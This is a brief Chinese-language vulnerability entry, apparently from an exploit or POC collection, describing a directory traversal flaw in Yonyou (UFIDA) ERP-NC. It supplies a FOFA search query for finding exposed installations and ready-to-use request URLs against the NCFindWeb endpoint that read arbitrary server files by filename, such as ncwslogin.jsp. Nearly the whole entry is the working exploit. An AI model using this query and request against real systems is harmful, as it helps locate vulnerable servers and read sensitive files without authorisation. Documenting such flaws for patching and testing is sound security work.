### 描述
用友ERP-NC 存在目录遍历漏洞，攻击者可以通过目录遍历获取敏感文件信息
fofa：app="用友-UFIDA-NC"

### POC & EXP
```
http://127.0.0.1/NCFindWeb?service=IPreAlertConfigService&filename=

# 在filename后面加文件名即可读取文件
http://127.0.0.1/NCFindWeb?service=IPreAlertConfigService&filename=ncwslogin.jsp
```
